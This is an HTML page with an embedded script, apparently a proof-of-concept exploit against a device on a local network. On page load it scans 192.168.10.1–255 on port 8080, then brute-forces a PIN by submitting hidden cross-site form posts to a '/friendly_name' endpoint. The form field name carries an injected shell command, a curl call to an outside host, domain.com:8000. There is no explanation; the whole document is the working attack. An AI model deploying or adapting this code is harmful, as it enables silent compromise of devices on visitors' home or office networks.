
<html>
<body>

<iframe name="framy" style="display:none;"></iframe>

<form id="submitit">
        <input id="fin" name="name"></name>
</form>
...
<script>
  let gate = parseInt(window.location.search.substring(1))


  function sub(ip, code) {
        let f = document.getElementById("submitit");
        let n = document.getElementById("fin");
        n.name = "\";curl domain.com:8000/"+code+"\"";
        f.action="http://"+ip+"/friendly_name?code="+code
        f.method="POST"
        f.setAttribute("enctype", "text/plain")
        f.target="framy"
        f.submit();
  }

  function findPIN(ip) {
        let s = 0;
        let d = setInterval( () => {
                if (s == 1000) {
                        clearInterval(d)
                } else {
                        sub(ip, gate + (s++));
                }

        }, 250)
  }

  function findIP() {

    function check(ip)
    {
      let i = new Image()
      i.onerror = (x) => {
        findPIN(ip + ":8080")
      }
      i.src="//" + ip + ":8080/sinot_aqua.whatever"
    }

    for (let x = 1; x < 256; x++)
    {
        setTimeout(() => {
            check("192.168.10." + x)
        }, 1000);

    }
  }



  findIP()


</script>
</body>
</html>
